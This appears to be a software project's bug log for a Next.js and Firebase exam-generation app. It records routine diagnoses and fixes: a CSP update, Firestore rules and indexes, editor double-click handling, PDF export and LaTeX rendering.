**Fix:** Added `https://www.googletagmanager.com` to `script-src`, and `https://www.google-analytics.com`, `https://*.google-analytics.com`, `https://*.analytics.google.com` to `connect-src`, in **both** `src/proxy.ts` (the one actually enforced on page navigations) and `createSecurityHeaders()` in `src/lib/security.ts` (kept consistent even though it's currently only wired to API JSON responses, to avoid the same trap resurfacing if it's ever applied to page responses). Verified: (1) curled a local dev server (`localhost:3000`, then `localhost:3005` under the Playwright-managed `next dev --turbopack` instance) and read the raw `content-security-policy` response header back — confirmed both new domains present. (2) Ran a one-off Playwright script against the live page that recorded every network response matching `googletagmanager.com` / `google-analytics.com` / `analytics.google.com`: `gtag.js` loaded with `200`, and the GA4 beacon (`https://www.google-analytics.com/g/collect?...&en=page_view...`) fired and returned `204` (GA4's normal success response for `/g/collect`, not an error) — so this is a genuine network-level confirmation the hit landed, not just a CSP-permits-it check. Zero console/page errors were captured during that run. (3) Ran `e2e/smoke.spec.ts`'s `landing page loads without errors` twice in isolation (both green) and the full 12-test `smoke.spec.ts` file once (12/12 green) via `npx playwright test`. (4) `npm run type-check` clean (no code paths changed beyond the two CSP header strings).

---

## BUG-015: Stale test assertion in `generate-prompts.test.ts` didn't match the (intentionally restored) `[id: ...]` chapter tags

**Status:** Fixed
**Severity:** Low
**Area:** Testing / Generation
**Reported:** 2026-09-18
**Fixed:** 2026-09-18

**Description:** QA's full-suite run flagged `src/__tests__/generate-prompts.test.ts` (chapter-coverage "packs multiple chapters into one exercise" case) failing: it asserted the literal string `- Exercise 1 → "Nombres complexes" + "Équations différentielles"...` but `buildChapterDistribution()` in `src/lib/prompts/generate.ts` actually emits `"Nombres complexes" [id: ter-math-complex] + ...` — an inline machine-readable id tag per chapter.
**Root cause:** Not a regression. `git log -S` traced the `[id: ...]` tagging to PR #8, "restore-chapter-id-tagging" (commit `5487cc8`), which deliberately restored the id tags so the model copies real curriculum ids verbatim into each exercise's `chapterIds` field instead of guessing/hallucinating them (see CLAUDE.md §4 anti-hallucination rule). The test predates that restore and was never updated to match.
**Fix:** Updated the assertion in `generate-prompts.test.ts` to expect the current output including both chapters' `[id: ...]` tags and the current "include ALL of their ids in that exercise's chapterIds" instruction text. No production code changed. Full suite now green (60/60), `npm run type-check` clean.

---

## BUG-013: "My School" bank silently shows empty — missing Firestore composite index for `schoolBank` queries

**Status:** Fix on disk, not yet deployed
**Severity:** High
**Area:** Data / Bank
**Reported:** 2026-09-18
**Fixed:** Not yet — needs `firebase deploy --only firestore:indexes` or a manual Firebase Console index creation, blocked by the same Claude Code "Production Deploy" guardrail as BUG-011

**Description:** Every Pro teacher who sets a school and opens `/bank`'s "My School" tab silently sees an empty shared-exercises list instead of their colleagues' real contributions, with no error shown to the user — `getSchoolBankExercises()` (`src/app/bank/page.tsx`) catches the failure and returns `[]`. Surfaced via the dev server's own console output while re-running a Phase 5 e2e test (`FirebaseError: The query requires an index`), not via any user report — this is a genuinely broken feature, not a test artifact.
**Root cause:** The query is `where("schoolSlug", "==", slug).orderBy("sharedAt", "desc")` on the `schoolBank` collection — Firestore requires a composite index for a query that combines an equality filter with an `orderBy` on a different field, and `firestore.indexes.json` only defined a *different* composite index for this collection (`curriculumId` + `subject` + `exercise.chapterIds`, used by a separate cross-school lookup), never one covering `schoolSlug` + `sharedAt`. Same class of issue as BUG-011: the deployed Firestore config silently doesn't match what the app's own queries need, masked here by the query's own try/catch swallowing the error into an empty array instead of surfacing it.
**Fix:** Added the missing composite index (`schoolSlug` ASC, `sharedAt` DESC) to `firestore.indexes.json`. **Not yet deployed** — same guardrail that blocked `firebase deploy` for BUG-011 blocks it here too. Antoine needs to run `firebase deploy --only firestore:indexes` himself (or open the direct Firebase Console link the error message itself provides — check the browser dev console on `/bank` with "My School" open and a school with real shared exercises — and click "Create Index" there), then confirm by reloading `/bank`'s My School tab.

## BUG-012: Double-click-to-edit-raw-LaTeX never worked in Chromium for math nodes (and any other atomic contenteditable block)

**Status:** Fixed
**Severity:** Medium
**Area:** UI / Generation (ExerciseEditor)
**Reported:** 2026-09-18
**Fixed:** 2026-09-18

**Description:** In the exercise editor, double-clicking a KaTeX-rendered math expression (or any other `[data-raw][contenteditable="false"]` atomic block — tables, image/document blocks, "Étape N" step badges) inside a `contenteditable="true"` field was supposed to swap it for its raw markdown/LaTeX source so a teacher could hand-edit it. It never actually worked, in real Chrome/Chromium as well as Playwright — a genuine, reproducible app bug, not a test artifact (confirmed by driving raw `mousedown`/`mouseup` events and by manually mutating the DOM outside any event handler, which worked and stuck).
**Root cause (three compounding issues, all in `ExerciseEditor.tsx`):**
1. Chromium does not reliably synthesize `click`/`dblclick` DOM events for a `contenteditable="false"` island nested inside a `contenteditable="true"` ancestor — `onDoubleClick` silently never fired for these nodes at all (confirmed by capturing every mouse event at the document level: `mousedown`/`mouseup` fired consistently, `click`/`dblclick` did not).
2. Chromium selects such an atomic island as a whole unit on a single click. The field's existing `onMouseUp={fragState.handleSelect}` (for the unrelated "select text, ask AI to rewrite this fragment" feature) treated that as a normal text selection and popped the fragment-regenerate toolbar, and `handleSelect`'s ancestor-based check for this case didn't fire either — Chromium represents the selection's start/end container as the *shared parent*, bracketing the atomic node as a sibling, not as a descendant of it. Every re-render this toolbar triggered replaced the whole `dangerouslySetInnerHTML` subtree with an equivalent-but-different DOM node, so nothing that compared node identity across the two clicks of a double-click could ever match.
3. Once (1) and (2) were fixed and the raw text was actually swapped in during the second `mousedown`, the browser still finalized its own native double-click "select word" behavior on the following `mouseup` — now landing on ordinary text instead of an atomic node — which selected a word of the freshly revealed LaTeX and popped the fragment toolbar again, whose re-render stomped the edit right back to the original KaTeX rendering before Playwright (or a real user) ever saw it.
**Fix:** Replaced the native `onDoubleClick` handler in both `RichField` and `RichFieldInline` with a `useRawReveal()` hook driven off `onMouseDown` click position + timing (two mousedowns on a `[data-raw]` node within 500ms and 8px count as a double-click), since `mousedown` fires reliably where `click`/`dblclick` do not. Guarded `handleSelect` to ignore a selection that exactly brackets a single atomic `[data-raw][contenteditable="false"]` sibling, so it no longer pops the fragment toolbar for these nodes. Added `e.preventDefault()` on the double-click-triggering `mousedown` plus an explicit collapsed-caret selection on the newly inserted text node, so the browser's own native selection algorithm never gets a chance to re-select and re-trigger the toolbar afterward. Verified with 3 consecutive clean runs of the previously-flaky-to-broken test (`phase-3-generation-editor.spec.ts`, "double-clicking the math node in the statement reveals raw LaTeX for editing").

---

## BUG-011: Firestore client reads denied project-wide since 2026-05-20 — Firebase project was still on its auto-generated test-mode rule

**Status:** Fixed
**Severity:** Critical
**Area:** Data / Auth
**Reported:** 2026-09-16
**Fixed:** 2026-09-17

**Description:** Every authenticated user's Firestore client-SDK read of their own profile (`users/{uid}`) failed with "Missing or insufficient permissions," every time, for every user. Console showed `[AuthContext] Firestore listener error — falling back to API`. The app didn't visibly break for real users because `AuthContext.tsx` already had an Admin-SDK-backed `/api/auth/profile` fallback with 15s polling, built for exactly this kind of failure — but every signed-in user was silently running on that slower, non-realtime path the whole time, and any purely client-side Firestore usage elsewhere in the app would have been fully broken.
**Root cause:** The Firebase project's *deployed* Firestore rules were never actually set to the real rules in `firestore.rules` (correct and present in this repo since 2026-07-31, apparently written but never deployed). They were still Firebase's auto-generated "test mode" starter rule from project creation — `allow read, write: if request.time < timestamp.date(2026, 5, 20)` — which unconditionally denies all reads/writes once its hardcoded expiry passes. That expiry was **2026-05-20**, so the entire project had zero working Firestore client access for roughly four months before this was caught by an e2e test failure (see `DAILY_LOG.md`'s 2026-09-16/17 entries for the full diagnostic trail, including two Claude Code safety guardrails — "Production Deploy" and "Modify Shared Resources" — that correctly blocked the AI assistant from running `firebase deploy` or even pre-filling the console's rules editor, requiring the founder to do the actual publish by hand).
**Fix:** Founder published the repo's real `firestore.rules` (per-user `users/{uid}` and `users/{uid}/exams/{examId}` ownership checks, `schoolBank` read for any authenticated user, `student_profiles`/`student_attempts` ownership checks, deny-all fallback) via the Firebase Console. Verified via two previously-failing e2e tests (`phase-8-pricing-upgrade-misc.spec.ts`'s Pro-badge and Scanner pro-tier tests) — both now pass cleanly with normal timing and no permission errors.

---

## BUG-010: Dashboard "Download PDF" produces a corrupt, unopenable file

**Status:** Fixed
**Severity:** Critical
**Area:** Export
**Reported:** 2026-09-16
**Fixed:** 2026-09-16

**Description:** From a saved exam's card on `/dashboard`, clicking "Download PDF" downloaded a file named `<title>.pdf` that no PDF viewer could open. `/create/export`'s own PDF option was unaffected — it opens `/print` (browser print-to-PDF), a completely separate code path.
**Root cause:** `src/app/api/export/route.ts`'s `POST` handler treats `format: "word"` and `format: "pdf"` identically — both call `generateWordDocument()`, which only ever builds real `.docx` (OOXML/ZIP) bytes via the `docx` library. The `format === "pdf"` branch just swaps the response's `Content-Type` to `application/pdf` and the filename extension to `.pdf` without changing the actual bytes, so the downloaded file is DOCX binary data mislabeled as a PDF. `/create/export`'s PDF button never hit this endpoint at all (it opens `/print`, which renders through `src/lib/renderContent.ts`, the live web pipeline, and uses the real browser print dialog) — only `/dashboard`'s "Download PDF" button (`handleDownload("pdf")` in `src/app/dashboard/page.tsx`) called `/api/export` with `format: "pdf"`, so the bug was isolated to that one entry point.
**Fix:** `/dashboard`'s `handleDownload("pdf")` now writes the saved exam's `context`/`exercises`/`templateId` into the same `sessionStorage` keys `/print` reads (`imtihan_context`, `imtihan_exercises`, `imtihan_templateId`) and opens `/print` in a new tab, reusing the already-correct browser-print path instead of the broken server endpoint. `/api/export`'s `format: "pdf"` branch itself is untouched and still exists — a real server-side PDF renderer (`@react-pdf/renderer`, per `CLAUDE.md`'s tech stack table) is still not built; nothing currently calls that branch after this fix, but it should not be wired to a new caller until it actually generates PDF bytes.

---

## BUG-008: \boxed{} final answers with stray internal $ delimiters render as raw LaTeX
**Status:** Fixed
**Severity:** High
**Area:** UI / Generation / Math rendering
**Reported:** 2026-09-03
**Fixed:** 2026-09-03

**Description:** Physics/chemistry corrigés sometimes showed the raw LaTeX code instead of rendered math,
e.g. `\boxed{$y = h$ + x\tan\alpha - \frac{g}{2v_0^2\cos^2\alpha}\,x^2}` appeared verbatim on screen.
**Root cause:** The generation prompt told the AI to wrap final answers as `$\boxed{result}$` (one outer
$...$ pair) but a separate "wrap every variable in $...$" rule caused the AI to also nest `$...$` around
sub-expressions INSIDE the `\boxed{}` braces. `renderContent.ts`'s `splitMath()` naively finds the first
`$` and treats it as a delimiter boundary — it cut straight through the `\boxed{...}` braces, corrupting
the brace matching and leaving everything after the first internal `$` as unrendered raw text.
**Fix:** (1) Added `fixBoxedMath()` in `renderContent.ts` — a brace-depth-aware preprocessing pass that
finds every `\boxed{...}` span (correctly handling nested braces like `\frac{a}{b}` inside), strips any
stray `$` found inside, and ensures the whole expression is wrapped in exactly one outer `$...$` pair
before the normal KaTeX pipeline runs. Runs defensively regardless of what the AI outputs. (2) Clarified
`src/lib/prompts/generate.ts`'s boxed-answer rules to explicitly forbid internal `$` delimiters, with a
right/wrong example. Added 4 new cases (18-21) to `test-render.mjs`'s regression harness — all pass
(21/21 total).

---

## BUG-009: Some selected chapters get zero exercises ("Chapter coverage" warning)
**Status:** Fixed
**Severity:** Medium
**Area:** Generation / Prompts
**Reported:** 2026-09-03
**Fixed:** 2026-09-03

**Description:** When a teacher selected multiple chapters (e.g. "Mécanique — mouvements dans l'espace"
and "Électromagnétisme" among others), the generated exam sometimes had zero exercises tagged with one
or more of the selected chapters — flagged by the `/create/generate` "Chapter coverage" warning ("Some
chapters have no exercise — regenerate individual questions to adjust coverage").
**Root cause:** Unlike difficulty (which gets an explicit per-exercise breakdown — "Easy: 2, Medium: 1,
Hard: 1"), chapters had no equivalent per-exercise assignment. The prompt only said "stay within these
selected chapters" with no requirement that every one of them actually appear, so with a short exercise
count relative to the number of selected chapters, the AI could freely concentrate all exercises on just
1-2 chapters.
**Fix:** Added `buildChapterDistribution()` in `src/lib/prompts/generate.ts` — deterministically maps
every selected chapter to a specific exercise number (round-robin) before generation, mirroring the
difficulty breakdown pattern. When there are more chapters than exercises, multiple chapters are assigned
to the same exercise with an explicit instruction to cover each as a distinct sub-question rather than
dropping any. Verified the distribution algorithm against 6 scenarios (more/fewer/equal chapters vs.
exercises) — every chapter is guaranteed at least one assigned exercise slot in all cases. Also
strengthened the system prompt's chapter-scope rule to reference this mandatory coverage requirement.

---

## BUG-001: Register page syntax error — double `return (` statement
**Status:** Fixed
**Severity:** Critical
**Area:** Auth / UI
**Reported:** 2026-04-24
**Fixed:** 2026-04-24

**Description:** `src/app/auth/register/page.tsx` had a duplicate `return (` statement and an extra stray `</div>`, causing a Turbopack parse error at build time. The page was completely unreachable.
**Root cause:** Manual editing left two consecutive `return (` lines inside `RegisterForm` and an unmatched closing `</div>`.
**Fix:** Rewrote the file in full to restore a single clean `return (` and correct JSX structure.

---

## BUG-002: Google sign-in redirect silently fails — session cookie not set
**Status:** Fixed
**Severity:** High
**Area:** Auth
**Reported:** 2026-04-24
**Fixed:** 2026-04-24

**Description:** Clicking "Continue with Google" on login or register appeared to do nothing — the popup completed but the user was not navigated to the dashboard/create page.
**Root cause (1):** `POST /api/auth/session` was using `cookies()` from `next/headers` to set the `__session` cookie inside a Route Handler. In Next.js 15 App Router, this does not reliably emit a `Set-Cookie` response header on client `fetch` calls. The cookie was never stored in the browser, so the middleware saw no session and immediately redirected back to `/auth/login`.
**Root cause (2):** The client-side `setSessionCookie()` helper did not check `res.ok`, so a 500 response from the session route was swallowed silently and `window.location.assign()` fired without a valid session.
**Fix:** Replaced `cookies().set()` with `response.cookies.set()` on the `NextResponse` object in the route handler. Added `if (!res.ok) throw new Error(...)` in `setSessionCookie()` so failures surface as visible error messages instead of silent loops.

---

## BUG-003: Community page fails to build — unclosed blur-container `<div>`
**Status:** Fixed
**Severity:** Critical
**Area:** UI / Community
**Reported:** 2026-04-24
**Fixed:** 2026-04-24

**Description:** Turbopack reported `Expected '</', got 'jsx text'` at the `</main>` closing tag in `src/app/community/page.tsx`, preventing the build.
**Root cause:** The wrapping `<div className={cn("transition-all duration-700", isFree && "opacity-40 blur-sm ...")}>` opened at line 191 was never closed. Its closing `</div>` was missing before `</main>`.
**Fix:** Added the missing `</div>` immediately before `</main>`.

---

## BUG-004: Export step indicator shows "Step 3 of 5" instead of "Step 5 of 5"
**Status:** Fixed
**Severity:** Low
**Area:** UI / Export
**Reported:** 2026-07-31
**Fixed:** 2026-07-31

**Description:** The export page (`/create/export`) rendered `<StepIndicator current={3} />` and `<StepLabel step={3} />`, so the progress dots showed Step 3 as active and the label read "Step 3 of 5" — visually incorrect for the final step.
**Root cause:** Copy-paste error when the export page was created.
**Fix:** Changed both props to `current={5}` / `step={5}`.

---

## BUG-005: "Include corrigé" email checkbox had no effect
**Status:** Fixed
**Severity:** Medium
**Area:** Export / API
**Reported:** 2026-07-31
**Fixed:** 2026-07-31

**Description:** The export page has an "Include corrigé" checkbox for email delivery (`emailIncludeSolution`) and an "Includes corrigé / Exam only" toggle for Word download (`includeAnswerKey`). Neither value was being honoured — the server always generated documents with the full answer key regardless of the toggle state.
**Root cause (1):** `emailIncludeSolution` was tracked in state but never included in the JSON body sent to `/api/export/send`.
**Root cause (2):** `/api/export/route.ts` `RequestSchema` had no `includeAnswerKey` field, so the value sent by the client was silently dropped.
**Root cause (3):** `generateWordDocument` had no `includeAnswerKey` parameter.
**Fix:** Added `includeAnswerKey` to `RequestSchema`, updated `generateWordDocument` signature to accept it with a default of `true`, added an early return that skips the corrigé section when `false`. Updated `/api/export/send` to accept and forward `includeSolution`. Updated client to pass `includeSolution: emailIncludeSolution` in the email request body.

---

## BUG-006: Math rendering — subscripts, Greek letters, \\text{} appeared as raw LaTeX
**Status:** Fixed
**Severity:** High
**Area:** UI / Generation
**Reported:** 2026-07-30
**Fixed:** 2026-07-31

**Description:** Raw LaTeX strings appeared in the exercise preview, e.g. `Z_0 = $R = 50$ \text{ Ω}$`. The `splitMath` function mishandled odd numbers of `$` delimiters, and the text-segment processor didn't catch `\Omega`, `\text{}`, `\frac{}{}`, or subscripted variables like `R_1`.
**Root cause:** (a) `splitMath` treated unclosed `$` as the start of a math block, creating a huge "math" segment from the stray `$` to the end of the string; (b) the inline safety net only matched `\ce{}`, `\vec{}`, and a handful of other commands — not `\text{}`, Greek letters, or subscripted variable patterns; (c) the final cleanup pass wrapped bare LaTeX in `$...$` strings but never re-rendered them to KaTeX.
**Fix:** Modified `splitMath` to strip the opening delimiter and treat the rest as plain text when no closing delimiter is found. Expanded the inline safety net to auto-wrap: `\text{}`, bare Greek letters (`\Omega`, `\alpha`, etc.), `\frac{A}{B}` (two-brace handling), and subscripted variables (`R_1`, `Z_0`, `U_{CE}` — with `{` in the lookbehind to prevent double-wrapping inside `\cmd{…}` arguments). Removed the broken final-cleanup `$...$` wrapping that was adding delimiters without rendering them. Confirmed with a 17-case regression test (17/17 pass).

---

## BUG-007: Landing page buttons and cards had stale indigo drop-shadow colours
**Status:** Fixed
**Severity:** Low
**Area:** UI / Landing
**Reported:** 2026-07-31
**Fixed:** 2026-07-31

**Description:** Button hover shadows and card hover shadows on the landing page used hardcoded `rgba(79,70,229,…)` — the old indigo accent — even after the accent was reverted to emerald `#1a5e3f`. The shadows glowed indigo/purple instead of emerald on hover.
**Root cause:** The previous colour revert fixed CSS variables (`--accent` → emerald) but missed 7 hardcoded `rgba()` values in Tailwind arbitrary shadow classes in `page.tsx`, `Button.tsx`, and `LandingNav.tsx`.
**Fix:** Replaced all 7 occurrences with `rgba(26,94,63,…)` (emerald equivalent). The `indigo-600` in `renderContent.ts` step-badge colour rotation is intentional and was left unchanged.

---

## Reporting a Bug

1. Check this file first — it might already be documented.
2. Check `CLAUDE.md` section 12 "Known Gotchas" — might be a known env issue.
3. If new, add an entry above with the next BUG-XXX number.
4. If urgent (crash / data loss), mark as **Critical** and fix before any other work.
